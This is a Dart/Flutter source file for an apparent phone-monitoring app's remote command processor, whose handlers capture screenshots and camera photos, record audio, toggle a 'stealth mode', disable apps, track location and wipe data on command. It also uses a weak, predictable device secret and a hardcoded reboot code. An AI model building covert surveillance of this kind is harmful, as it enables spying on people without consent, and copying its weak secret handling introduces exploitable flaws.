import 'dart:async';
import 'dart:convert';
import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:monitored_app/core/services/database_service.dart';
import 'package:monitored_app/core/collectors/media_collector.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/services/unlock_service.dart';
import 'package:monitored_app/app/locator.dart';

enum CommandPriority {
  emergency(0),
  critical(1),
  normal(2),
  low(3);

  const CommandPriority(this.value);
  final int value;
}

enum CommandStatus {
  pending,
  executing,
  completed,
  failed,
  expired;
}

class RemoteCommand {
  final String id;
  final String type;
  final Map<String, dynamic> parameters;
  final CommandPriority priority;
  final DateTime issuedAt;
  final DateTime? expiresAt;
  final String signature;
  final String issuer;

  RemoteCommand({
    required this.id,
    required this.type,
    required this.parameters,
    required this.priority,
    required this.issuedAt,
    this.expiresAt,
    required this.signature,
    required this.issuer,
  });

  factory RemoteCommand.fromJson(Map<String, dynamic> json) {
    return RemoteCommand(
      id: json['id'],
      type: json['type'],
      parameters: json['parameters'] ?? {},
      priority: CommandPriority.values.firstWhere(
        (p) => p.name == json['priority'],
        orElse: () => CommandPriority.normal,
      ),
      issuedAt: DateTime.parse(json['issued_at']),
      expiresAt: json['expires_at'] != null ? DateTime.parse(json['expires_at']) : null,
      signature: json['signature'],
      issuer: json['issuer'],
    );
  }

  Map<String, dynamic> toJson() {
    return {
      'id': id,
      'type': type,
      'parameters': parameters,
      'priority': priority.name,
      'issued_at': issuedAt.toIso8601String(),
      'expires_at': expiresAt?.toIso8601String(),
      'signature': signature,
      'issuer': issuer,
    };
  }

  bool get isExpired {
    if (expiresAt == null) return false;
    return DateTime.now().isAfter(expiresAt!);
  }
}

class CommandExecutionResult {
  final String commandId;
  final CommandStatus status;
  final Map<String, dynamic>? result;
  final String? error;
  final DateTime executedAt;
  final Duration executionTime;

  CommandExecutionResult({
    required this.commandId,
    required this.status,
    this.result,
    this.error,
    required this.executedAt,
    required this.executionTime,
  });

  Map<String, dynamic> toJson() {
    return {
      'command_id': commandId,
      'status': status.name,
      'result': result,
      'error': error,
      'executed_at': executedAt.toIso8601String(),
      'execution_time_ms': executionTime.inMilliseconds,
    };
  }
}

class RemoteCommandProcessor {
  static final RemoteCommandProcessor _instance = RemoteCommandProcessor._internal();
  factory RemoteCommandProcessor() => _instance;
  RemoteCommandProcessor._internal();

  final DatabaseService _databaseService = locator<DatabaseService>();
  final StorageService _storageService = locator<StorageService>();
  final MediaCollector _mediaCollector = locator<MediaCollector>();
  final UnlockService _unlockService = locator<UnlockService>();

  static const MethodChannel _channel = MethodChannel('com.xpsafeconnect.monitored_app/commands');

  // Command handlers registry
  final Map<String, Future<Map<String, dynamic>> Function(RemoteCommand)> _commandHandlers = {};
  
  // Command execution queue
  final List<RemoteCommand> _commandQueue = [];
  bool _isProcessing = false;
  
  // Security configuration
  late String _deviceSecret;

  Future<void> initialize() async {
    await _loadSecurityConfiguration();
    _registerCommandHandlers();
    _startCommandProcessor();
    
    debugPrint('RemoteCommandProcessor initialized');
  }

  Future<void> _loadSecurityConfiguration() async {
    // Load device secret for command verification
    _deviceSecret = await _storageService.readSecure('device_secret') ?? '';
    if (_deviceSecret.isEmpty) {
      _deviceSecret = _generateDeviceSecret();
      await _storageService.writeSecure('device_secret', _deviceSecret);
    }
    
  }

  String _generateDeviceSecret() {
    final random = List.generate(32, (i) => i + 1);
    random.shuffle();
    return base64.encode(random);
  }

  void _registerCommandHandlers() {
    _commandHandlers.addAll({
      'emergency_lock': _handleEmergencyLock,
      'capture_screen': _handleCaptureScreen,
      'capture_photo': _handleCapturePhoto,
      'record_audio': _handleRecordAudio,
      'wipe_sensitive_data': _handleWipeSensitiveData,
      'enable_stealth_mode': _handleEnableStealthMode,
      'disable_stealth_mode': _handleDisableStealthMode,
      'disable_apps': _handleDisableApps,
      'enable_apps': _handleEnableApps,
      'set_location_tracking': _handleSetLocationTracking,
      'get_device_status': _handleGetDeviceStatus,
      'send_message': _handleSendMessage,
      'play_sound': _handlePlaySound,
      'trigger_alarm': _handleTriggerAlarm,
      'update_config': _handleUpdateConfig,
      'force_sync': _handleForceSync,
      'reboot_device': _handleRebootDevice,
    });
  }

  void _startCommandProcessor() {
    Timer.periodic(const Duration(seconds: 5), (_) => _processCommandQueue());
  }

  /// Processes an incoming command
  Future<CommandExecutionResult> processCommand(RemoteCommand command) async {
    // Validate command signature
    if (!await _validateCommandSignature(command)) {
      return CommandExecutionResult(
        commandId: command.id,
        status: CommandStatus.failed,
        error: 'Invalid command signature',
        executedAt: DateTime.now(),
        executionTime: Duration.zero,
      );
    }

    // Check if command is expired
    if (command.isExpired) {
      return CommandExecutionResult(
        commandId: command.id,
        status: CommandStatus.expired,
        error: 'Command has expired',
        executedAt: DateTime.now(),
        executionTime: Duration.zero,
      );
    }

    // Add to queue based on priority
    _addToQueue(command);
    
    // Process immediately if high priority
    if (command.priority.value <= CommandPriority.critical.value) {
      return await _executeCommand(command);
    }

    return CommandExecutionResult(
      commandId: command.id,
      status: CommandStatus.pending,
      executedAt: DateTime.now(),
      executionTime: Duration.zero,
    );
  }

  Future<bool> _validateCommandSignature(RemoteCommand command) async {
    try {
      // Create message to verify
      final message = '${command.id}:${command.type}:${command.issuedAt.millisecondsSinceEpoch}:${jsonEncode(command.parameters)}';
      
      // Compute expected signature
      final key = utf8.encode(_deviceSecret);
      final messageBytes = utf8.encode(message);
      final hmac = Hmac(sha256, key);
      final expectedSignature = base64.encode(hmac.convert(messageBytes).bytes);
      
      // Verify signature
      final isValid = command.signature == expectedSignature;
      
      if (!isValid) {
        debugPrint('Command signature validation failed for ${command.id}');
        await _logSecurityEvent('invalid_command_signature', command.toJson());
      }
      
      return isValid;
    } catch (e) {
      debugPrint('Error validating command signature: $e');
      return false;
    }
  }

  void _addToQueue(RemoteCommand command) {
    // Remove any existing command with same ID
    _commandQueue.removeWhere((c) => c.id == command.id);
    
    // Insert based on priority
    final insertIndex = _commandQueue.indexWhere((c) => c.priority.value > command.priority.value);
    if (insertIndex == -1) {
      _commandQueue.add(command);
    } else {
      _commandQueue.insert(insertIndex, command);
    }
    
    debugPrint('Command ${command.id} added to queue (priority: ${command.priority.name})');
  }

  Future<void> _processCommandQueue() async {
    if (_isProcessing || _commandQueue.isEmpty) return;
    
    _isProcessing = true;
    
    try {
      final command = _commandQueue.removeAt(0);
      
      if (command.isExpired) {
        debugPrint('Skipping expired command: ${command.id}');
        return;
      }
      
      final result = await _executeCommand(command);
      await _sendCommandResult(result);
      
    } catch (e) {
      debugPrint('Error processing command queue: $e');
    } finally {
      _isProcessing = false;
    }
  }

  Future<CommandExecutionResult> _executeCommand(RemoteCommand command) async {
    final stopwatch = Stopwatch()..start();
    
    try {
      debugPrint('Executing command: ${command.type} (${command.id})');
      
      final handler = _commandHandlers[command.type];
      if (handler == null) {
        throw UnsupportedError('Unknown command type: ${command.type}');
      }
      
      final result = await handler(command);
      stopwatch.stop();
      
      return CommandExecutionResult(
        commandId: command.id,
        status: CommandStatus.completed,
        result: result,
        executedAt: DateTime.now(),
        executionTime: stopwatch.elapsed,
      );
      
    } catch (e) {
      stopwatch.stop();
      debugPrint('Command execution failed: $e');
      
      return CommandExecutionResult(
        commandId: command.id,
        status: CommandStatus.failed,
        error: e.toString(),
        executedAt: DateTime.now(),
        executionTime: stopwatch.elapsed,
      );
    }
  }

  // Command Handlers
  
  Future<Map<String, dynamic>> _handleEmergencyLock(RemoteCommand command) async {
    await _unlockService.lockDevice();
    await _logSecurityEvent('emergency_lock_activated', command.toJson());
    
    return {
      'action': 'emergency_lock',
      'status': 'activated',
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleCaptureScreen(RemoteCommand command) async {
    final screenshot = await _mediaCollector.captureScreenshot();
    
    if (screenshot != null) {
      return {
        'action': 'capture_screen',
        'status': 'success',
        'media_id': screenshot['media_id'],
        'file_path': screenshot['file_path'],
        'file_size': screenshot['file_size'],
        'timestamp': DateTime.now().toUtc().toIso8601String(),
      };
    }
    
    throw Exception('Failed to capture screenshot');
  }

  Future<Map<String, dynamic>> _handleCapturePhoto(RemoteCommand command) async {
    final frontCamera = command.parameters['front_camera'] == true;
    final photo = await _mediaCollector.capturePhoto(frontCamera: frontCamera);
    
    if (photo != null) {
      return {
        'action': 'capture_photo',
        'status': 'success',
        'camera_type': frontCamera ? 'front' : 'back',
        'media_id': photo['media_id'],
        'file_path': photo['file_path'],
        'file_size': photo['file_size'],
        'timestamp': DateTime.now().toUtc().toIso8601String(),
      };
    }
    
    throw Exception('Failed to capture photo');
  }

  Future<Map<String, dynamic>> _handleRecordAudio(RemoteCommand command) async {
    final duration = command.parameters['duration'] ?? 30;
    final audio = await _mediaCollector.recordAudio(durationSeconds: duration);
    
    if (audio != null) {
      return {
        'action': 'record_audio',
        'status': 'success',
        'duration_seconds': duration,
        'media_id': audio['media_id'],
        'file_path': audio['file_path'],
        'file_size': audio['file_size'],
        'timestamp': DateTime.now().toUtc().toIso8601String(),
      };
    }
    
    throw Exception('Failed to record audio');
  }

  Future<Map<String, dynamic>> _handleWipeSensitiveData(RemoteCommand command) async {
    // Implement secure data wiping
    await _databaseService.clearSensitiveData();
    await _storageService.clearCache();
    
    return {
      'action': 'wipe_sensitive_data',
      'status': 'completed',
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleEnableStealthMode(RemoteCommand command) async {
    await _storageService.setBool('stealth_mode_enabled', true);
    await _channel.invokeMethod('enableStealthMode');
    
    return {
      'action': 'enable_stealth_mode',
      'status': 'activated',
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleDisableStealthMode(RemoteCommand command) async {
    await _storageService.setBool('stealth_mode_enabled', false);
    await _channel.invokeMethod('disableStealthMode');
    
    return {
      'action': 'disable_stealth_mode',
      'status': 'deactivated',
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleDisableApps(RemoteCommand command) async {
    final packageNames = List<String>.from(command.parameters['packages'] ?? []);
    
    for (final package in packageNames) {
      await _channel.invokeMethod('disableApp', {'package': package});
    }
    
    return {
      'action': 'disable_apps',
      'status': 'completed',
      'disabled_packages': packageNames,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleEnableApps(RemoteCommand command) async {
    final packageNames = List<String>.from(command.parameters['packages'] ?? []);
    
    for (final package in packageNames) {
      await _channel.invokeMethod('enableApp', {'package': package});
    }
    
    return {
      'action': 'enable_apps',
      'status': 'completed',
      'enabled_packages': packageNames,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleSetLocationTracking(RemoteCommand command) async {
    final enabled = command.parameters['enabled'] == true;
    final frequency = command.parameters['frequency'] ?? 900; // seconds
    
    await _storageService.setBool('location_tracking_enabled', enabled);
    await _storageService.setInt('location_interval_seconds', frequency);
    
    return {
      'action': 'set_location_tracking',
      'status': 'updated',
      'enabled': enabled,
      'frequency_seconds': frequency,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleGetDeviceStatus(RemoteCommand command) async {
    final batteryLevel = await _channel.invokeMethod<int>('getBatteryLevel') ?? 0;
    final isCharging = await _channel.invokeMethod<bool>('isCharging') ?? false;
    final storageUsed = await _channel.invokeMethod<int>('getStorageUsed') ?? 0;
    final storageTotal = await _channel.invokeMethod<int>('getStorageTotal') ?? 0;
    
    return {
      'action': 'get_device_status',
      'status': 'success',
      'device_status': {
        'battery_level': batteryLevel,
        'is_charging': isCharging,
        'storage_used_mb': storageUsed,
        'storage_total_mb': storageTotal,
        'storage_available_mb': storageTotal - storageUsed,
        'timestamp': DateTime.now().toUtc().toIso8601String(),
      },
    };
  }

  Future<Map<String, dynamic>> _handleSendMessage(RemoteCommand command) async {
    final message = command.parameters['message'] as String;
    final urgent = command.parameters['urgent'] == true;
    
    // Display message to user
    await _channel.invokeMethod('showMessage', {
      'message': message,
      'urgent': urgent,
    });
    
    return {
      'action': 'send_message',
      'status': 'delivered',
      'message': message,
      'urgent': urgent,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handlePlaySound(RemoteCommand command) async {
    final soundType = command.parameters['sound_type'] ?? 'notification';
    final volume = command.parameters['volume'] ?? 0.8;
    
    await _channel.invokeMethod('playSound', {
      'sound_type': soundType,
      'volume': volume,
    });
    
    return {
      'action': 'play_sound',
      'status': 'played',
      'sound_type': soundType,
      'volume': volume,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleTriggerAlarm(RemoteCommand command) async {
    final duration = command.parameters['duration'] ?? 30;
    
    await _channel.invokeMethod('triggerAlarm', {
      'duration_seconds': duration,
    });
    
    return {
      'action': 'trigger_alarm',
      'status': 'activated',
      'duration_seconds': duration,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleUpdateConfig(RemoteCommand command) async {
    final config = command.parameters['config'] as Map<String, dynamic>;
    
    for (final entry in config.entries) {
      await _storageService.setString('config_${entry.key}', entry.value.toString());
    }
    
    return {
      'action': 'update_config',
      'status': 'updated',
      'updated_keys': config.keys.toList(),
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleForceSync(RemoteCommand command) async {
    // Trigger immediate sync of all pending data
    await _databaseService.forceSyncAllPendingData();
    
    return {
      'action': 'force_sync',
      'status': 'triggered',
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<Map<String, dynamic>> _handleRebootDevice(RemoteCommand command) async {
    // This is a sensitive operation - add extra validation
    final confirmationCode = command.parameters['confirmation_code'];
    if (confirmationCode != 'EMERGENCY_REBOOT_2024') {
      throw Exception('Invalid confirmation code for device reboot');
    }
    
    await _logSecurityEvent('emergency_reboot_initiated', command.toJson());
    
    // Schedule reboot
    Timer(const Duration(seconds: 5), () async {
      await _channel.invokeMethod('rebootDevice');
    });
    
    return {
      'action': 'reboot_device',
      'status': 'scheduled',
      'reboot_in_seconds': 5,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };
  }

  Future<void> _sendCommandResult(CommandExecutionResult result) async {
    try {
      // Send result back to command issuer
      // This would typically go through the WebSocket or API
      debugPrint('Command result: ${result.toJson()}');
      
      // Store result in database for auditing
      await _databaseService.insertCommandExecutionResult(result);
      
    } catch (e) {
      debugPrint('Error sending command result: $e');
    }
  }

  Future<void> _logSecurityEvent(String eventType, Map<String, dynamic> metadata) async {
    await _databaseService.insertSecurityAuditEvent(
      eventType: eventType,
      description: 'Remote command security event',
      severity: 'HIGH',
      metadata: metadata,
    );
  }

  /// Gets the current command queue status
  Map<String, dynamic> getQueueStatus() {
    return {
      'queue_length': _commandQueue.length,
      'is_processing': _isProcessing,
      'pending_commands': _commandQueue.map((c) => {
        'id': c.id,
        'type': c.type,
        'priority': c.priority.name,
        'issued_at': c.issuedAt.toIso8601String(),
      }).toList(),
    };
  }

  /// Clears the command queue (emergency use only)
  void clearQueue() {
    _commandQueue.clear();
    debugPrint('Command queue cleared');
  }
}